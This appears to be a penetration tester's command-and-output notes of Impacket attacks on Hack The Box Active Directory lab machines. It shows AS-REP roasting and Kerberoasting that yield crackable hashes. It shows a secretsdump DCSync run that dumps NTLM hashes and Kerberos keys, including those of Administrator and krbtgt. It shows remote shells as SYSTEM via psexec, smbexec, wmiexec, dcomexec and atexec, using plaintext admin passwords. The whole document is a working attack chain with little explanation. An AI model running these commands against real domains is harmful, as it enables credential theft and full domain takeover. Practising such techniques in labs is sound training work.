## GetNPUsers
```sh
└─$ impacket-GetNPUsers -outputfile asreproast.txt -ts -dc-ip '10.129.95.180' -no-pass 'EGOTISTICAL-BANK.LOCAL/fsmith' -debug 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-07-30 06:27:34] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-07-30 06:27:34] [*] Getting TGT for fsmith
[2025-07-30 06:27:34] [+] Trying to connect to KDC at 10.129.95.180:88
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:b86517133043618f4b6aca6f0d97bed5$96e50d70ac316a65c724862915e51eca0ee6868fb128ec0f6dc46efded57f0de86e75e1d75ce72a6a737057053c6eb2644092bab36a64d97590e4682c5f3e452e6ff7be00aa3810edc8b0981357c0f9ed143e5c20a02b04b58f199b68f40aa4f4328a832efc773c94d942cb32bdc276037db142fe021438fb1a2d062fb482c40546358f94192c1cf7ae9738eb78478860ca40fb4d1ceaceb945ea7c563ce6bf71a426b952a3c9c22c27af78cca5e1d72c86778f8d7c0d43b1b56fe2bbb75baeba1bbe46d90e5ff26fb8f92406826c743e5975a731f0b4febb109c4ef91b12b62f65ff146718b6d3ecea6756e57c3e7dd5ce8e8fdbc1743854ec9f0dfc0cbc62f


└─$ impacket-GetNPUsers -outputfile asreproast.txt -ts -dc-ip '10.129.95.180' -usersfile user.txt 'EGOTISTICAL-BANK.LOCAL/' -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-07-30 06:07:02] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-07-30 06:07:02] [+] Trying to connect to KDC at 10.129.95.180:88
[2025-07-30 06:07:03] [+] Server time (UTC): 2025-07-30 17:07:03
[2025-07-30 06:07:03] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[2025-07-30 06:07:03] [+] Trying to connect to KDC at 10.129.95.180:88
[2025-07-30 06:07:04] [+] Server time (UTC): 2025-07-30 17:07:05
[2025-07-30 06:07:04] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[2025-07-30 06:07:04] [+] Trying to connect to KDC at 10.129.95.180:88
[2025-07-30 06:07:05] [+] Server time (UTC): 2025-07-30 17:07:06
[2025-07-30 06:07:05] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[2025-07-30 06:07:05] [+] Trying to connect to KDC at 10.129.95.180:88
[2025-07-30 06:07:07] [+] Server time (UTC): 2025-07-30 17:07:08
[2025-07-30 06:07:07] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[2025-07-30 06:07:07] [+] Trying to connect to KDC at 10.129.95.180:88
[2025-07-30 06:07:08] [+] Server time (UTC): 2025-07-30 17:07:09
[2025-07-30 06:07:08] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[2025-07-30 06:07:08] [+] Trying to connect to KDC at 10.129.95.180:88
[2025-07-30 06:07:10] [+] Server time (UTC): 2025-07-30 17:07:10
[2025-07-30 06:07:10] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[2025-07-30 06:07:10] [+] Trying to connect to KDC at 10.129.95.180:88
[2025-07-30 06:07:11] [+] Server time (UTC): 2025-07-30 17:07:11
[2025-07-30 06:07:11] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[2025-07-30 06:07:11] [+] Trying to connect to KDC at 10.129.95.180:88
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:4699f27f29b6ed010a42b58819aabf16$2d55add04f0cd69b29f78000be8544a4e8ec80488c2bc64a49c800b1ae0dee20b0125b949fae1c99085049f81101e1a3ebba19c58dae47fc4c4f3f9fb19dc828ffddf24a2a4a131a51117f927d9ddb3db283eea2fb49f215fdfe42368f08ae866313b177105a8dbfd1e495f911e1a646a0ddecd94744e5a63f068e39e593c0d2faf7fc5cdff30e8e94247a4270744a55e7f7407655d08f6ae4cec29a270f037124c905cbe8f66a82a63cf13486c40e1c84aee33c105e5c006710868ccaee87bd44b83a6a315065f1a4cf6f3230ac119d64d24fdef08c49458d0c14ea655d73a02056f1b30d8a66f980b8f3d7db419be3076aadabd98832932ad43fa704633eea
[2025-07-30 06:07:13] [+] Trying to connect to KDC at 10.129.95.180:88
[2025-07-30 06:07:14] [+] Server time (UTC): 2025-07-30 17:07:14
[2025-07-30 06:07:14] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[2025-07-30 06:07:14] [+] Trying to connect to KDC at 10.129.95.180:88
[2025-07-30 06:07:15] [+] Server time (UTC): 2025-07-30 17:07:16
[2025-07-30 06:07:15] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```


## GetUserSPNs
```sh
└─$ impacket-GetUserSPNs -outputfile svc_tgs.txt -ts -dc-ip 10.129.247.58 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-08-06 01:27:47] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-08-06 01:27:47] [+] Connecting to 10.129.247.58, port 389, SSL False
[2025-08-06 01:27:48] [+] Total of records returned 4
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-08-06 01:22:40.863350             



[2025-08-06 01:27:48] [-] CCache file is not found. Skipping...
[2025-08-06 01:27:48] [+] The specified path is not correct or the KRB5CCNAME environment variable is not defined
[2025-08-06 01:27:48] [+] Trying to connect to KDC at 10.129.247.58:88
[2025-08-06 01:27:48] [+] Trying to connect to KDC at 10.129.247.58:88
[2025-08-06 01:27:49] [+] Trying to connect to KDC at 10.129.247.58:88
```


## secretdump
```sh
└─$ impacket-secretsdump -ts 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!@10.129.95.180' -debug                          
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-08-08 11:30:49] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-08-08 11:30:53] [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[2025-08-08 11:30:55] [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[2025-08-08 11:30:55] [*] Using the DRSUAPI method to get NTDS.DIT secrets
[2025-08-08 11:30:55] [+] Session resume file will be sessionresume_BeeTsklm
[2025-08-08 11:31:00] [+] Calling DRSGetNCChanges for S-1-5-21-2966785786-3096785034-1186376766-500 
[2025-08-08 11:31:01] [+] SID lookup unsuccessful, falling back to DRSCrackNames/GUID lookups
[2025-08-08 11:31:01] [+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-500 
[2025-08-08 11:31:01] [+] Calling DRSGetNCChanges for {21368e06-7c54-4cd5-9421-8186a6d29f66} 
[2025-08-08 11:31:02] [+] Entering NTDSHashes.__decryptHash
[2025-08-08 11:31:02] [+] Decrypting hash for user: CN=Administrator,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[2025-08-08 11:31:02] [+] Leaving NTDSHashes.__decryptHash
[2025-08-08 11:31:02] [+] Entering NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:02] [+] Leaving NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:02] [+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-501 
[2025-08-08 11:31:02] [+] Calling DRSGetNCChanges for {b1298768-336d-40ba-a901-1da65816b899} 
[2025-08-08 11:31:03] [+] Entering NTDSHashes.__decryptHash
[2025-08-08 11:31:03] [+] Decrypting hash for user: CN=Guest,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[2025-08-08 11:31:03] [+] Leaving NTDSHashes.__decryptHash
[2025-08-08 11:31:03] [+] Entering NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:03] [+] Leaving NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:03] [+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-502 
[2025-08-08 11:31:03] [+] Calling DRSGetNCChanges for {63708f6a-ff17-4c00-9d92-dae7b3f739ec} 
[2025-08-08 11:31:04] [+] Entering NTDSHashes.__decryptHash
[2025-08-08 11:31:04] [+] Decrypting hash for user: CN=krbtgt,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
[2025-08-08 11:31:04] [+] Leaving NTDSHashes.__decryptHash
[2025-08-08 11:31:04] [+] Entering NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:04] [+] Leaving NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:04] [+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-1103 
[2025-08-08 11:31:04] [+] Calling DRSGetNCChanges for {9283072d-a2e1-4f8b-a34b-a16d6a979fa3} 
[2025-08-08 11:31:05] [+] Entering NTDSHashes.__decryptHash
[2025-08-08 11:31:05] [+] Decrypting hash for user: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
[2025-08-08 11:31:05] [+] Leaving NTDSHashes.__decryptHash
[2025-08-08 11:31:05] [+] Entering NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:05] [+] Leaving NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:05] [+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-1105 
[2025-08-08 11:31:05] [+] Calling DRSGetNCChanges for {b6a6403e-a7df-4abf-92fb-b5bf1a5e3aed} 
[2025-08-08 11:31:06] [+] Entering NTDSHashes.__decryptHash
[2025-08-08 11:31:06] [+] Decrypting hash for user: CN=Fergus Smith,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
[2025-08-08 11:31:06] [+] Leaving NTDSHashes.__decryptHash
[2025-08-08 11:31:06] [+] Entering NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:06] [+] Leaving NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:06] [+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-1108 
[2025-08-08 11:31:06] [+] Calling DRSGetNCChanges for {c84a4266-b01d-4a64-8c2d-ed930d18c489} 
[2025-08-08 11:31:06] [+] Entering NTDSHashes.__decryptHash
[2025-08-08 11:31:06] [+] Decrypting hash for user: CN=L Manager,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
[2025-08-08 11:31:06] [+] Leaving NTDSHashes.__decryptHash
[2025-08-08 11:31:06] [+] Entering NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:06] [+] Leaving NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:06] [+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-1000 
[2025-08-08 11:31:07] [+] Calling DRSGetNCChanges for {9f1d1db5-ce78-498d-aa90-16781495f771} 
[2025-08-08 11:31:07] [+] Entering NTDSHashes.__decryptHash
[2025-08-08 11:31:07] [+] Decrypting hash for user: CN=SAUNA,OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:7504784e68bb600a12667dc85792f5c1:::
[2025-08-08 11:31:07] [+] Leaving NTDSHashes.__decryptHash
[2025-08-08 11:31:07] [+] Entering NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:07] [+] Leaving NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:07] [+] Finished processing and printing user's hashes, now printing supplemental information
[2025-08-08 11:31:07] [*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:61155c90d28dfdea0aa2a08137574ce725e848688c5b75ce6dea57ae6cf41358
SAUNA$:aes128-cts-hmac-sha1-96:bb87c1e28416c3423848c16da0893d55
SAUNA$:des-cbc-md5:623143264c38bac7
[2025-08-08 11:31:07] [*] Cleaning up..
```



## exec
### psexec
```sh
└─$ impacket-psexec -ts 'active.htb/administrator:Ticketmaster1968@10.129.172.255' -debug 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-07-28 08:15:11] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-07-28 08:15:11] [+] StringBinding ncacn_np:10.129.172.255[\pipe\svcctl]
[2025-07-28 08:15:14] [*] Requesting shares on 10.129.172.255.....
[2025-07-28 08:15:17] [*] Found writable share ADMIN$
[2025-07-28 08:15:17] [*] Uploading file ISoEJWvP.exe
[2025-07-28 08:15:20] [*] Opening SVCManager on 10.129.172.255.....
[2025-07-28 08:15:22] [*] Creating service CEiG on 10.129.172.255.....
[2025-07-28 08:15:23] [*] Starting service CEiG.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> exit
[2025-07-28 08:17:19] [*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0
[2025-07-28 08:17:19] [*] Opening SVCManager on 10.129.172.255.....
[2025-07-28 08:17:21] [*] Stopping service CEiG.....
[2025-07-28 08:17:22] [*] Removing service CEiG.....
[2025-07-28 08:17:28] [*] Removing file ISoEJWvP.exe.....
```

### smbexec
```sh
└─$ impacket-smbexec -share 'C$' -ts -shell-type 'cmd' 'active.htb/administrator:Ticketmaster1968@10.129.172.255' -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-07-28 08:18:09] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-07-28 08:18:09] [+] StringBinding ncacn_np:10.129.172.255[\pipe\svcctl]
[2025-07-28 08:18:13] [+] Executing %COMSPEC% /Q /c echo cd  ^> \\%COMPUTERNAME%\C$\__output 2^>^&1 > %SYSTEMROOT%\BpZcNLCs.bat & %COMSPEC% /Q /c %SYSTEMROOT%\BpZcNLCs.bat & del %SYSTEMROOT%\BpZcNLCs.bat
[!] Launching semi-interactive shell - Careful what you execute

C:\Windows\system32>whoami
[2025-07-28 08:18:30] [+] Executing %COMSPEC% /Q /c echo whoami ^> \\%COMPUTERNAME%\C$\__output 2^>^&1 > %SYSTEMROOT%\TQtkUbvS.bat & %COMSPEC% /Q /c %SYSTEMROOT%\TQtkUbvS.bat & del %SYSTEMROOT%\TQtkUbvS.bat
nt authority\system

C:\Windows\system32>exit
```

### wmiexec
```sh
└─$ impacket-wmiexec -share 'C$' -ts -shell-type 'cmd' 'active.htb/administrator:Ticketmaster1968@10.129.172.255' -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-07-28 08:13:20] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-07-28 08:13:23] [*] SMBv2.1 dialect used
[2025-07-28 08:13:25] [+] Target system is 10.129.172.255 and isFQDN is False
[2025-07-28 08:13:25] [+] StringBinding: \\\\DC[\\PIPE\\atsvc]
[2025-07-28 08:13:25] [+] StringBinding: DC[49154]
[2025-07-28 08:13:25] [+] StringBinding: 10.129.172.255[49154]
[2025-07-28 08:13:25] [+] StringBinding chosen: ncacn_ip_tcp:10.129.172.255[49154]
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands

C:\>whoami
active\administrator

C:\>exit
```

### dcomexec
```sh
└─$ impacket-dcomexec -share 'C$' -ts -object 'MMC20' -shell-type 'cmd' 'active.htb/administrator:Ticketmaster1968@10.129.172.255' -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-07-28 09:12:29] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-07-28 09:12:31] [*] SMBv2.1 dialect used
[2025-07-28 09:12:33] [+] Target system is 10.129.172.255 and isFQDN is False
[2025-07-28 09:12:33] [+] StringBinding: DC[51092]
[2025-07-28 09:12:33] [+] StringBinding: 10.129.172.255[51092]
[2025-07-28 09:12:33] [+] StringBinding chosen: ncacn_ip_tcp:10.129.172.255[51092]
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands

C:\>whoami
active\administrator

C:\>exit
```

### atexec
```sh
└─$ impacket-atexec -ts 'active.htb/administrator:Ticketmaster1968@10.129.172.255' whoami -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-07-28 09:17:21] [!] This will work ONLY on Windows >= Vista
[2025-07-28 09:17:21] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-07-28 09:17:25] [*] Creating task \EDdbKsEL
[2025-07-28 09:17:26] [*] Running task \EDdbKsEL
[2025-07-28 09:17:27] [+] Calling SchRpcGetLastRunInfo for \EDdbKsEL
[2025-07-28 09:17:27] [*] Deleting task \EDdbKsEL
[2025-07-28 09:17:28] [*] Attempting to read ADMIN$\Temp\EDdbKsEL.tmp
nt authority\system

[2025-07-28 09:17:30] [+] Deleting file ADMIN$\Temp\EDdbKsEL.tmp
```
